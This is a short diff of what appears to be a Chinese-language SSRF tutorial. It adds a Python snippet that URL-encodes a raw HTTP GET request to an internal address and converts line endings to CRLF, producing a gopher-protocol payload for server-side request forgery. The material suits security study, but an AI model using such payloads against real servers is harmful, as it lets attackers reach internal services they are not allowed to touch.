@@ -97,6 +97,17 @@ new = tmp.replace("%0A","%0D%0A")
 result = urllib.parse.quote(new)
 print("gopher://"+host+"/_"+result)
 
+下面是GET:
+import urllib
+test =\
+"""GET /ssrf/get.php HTTP/1.1
+Host: 192.168.0.111
+"""  
+#注意后面一定要有回车，回车结尾表示http请求结束
+tmp = urllib.parse.quote(test)
+new = tmp.replace('%0A','%0D%0A')
+result = '_'+new
+print(result)
 ```
 
 
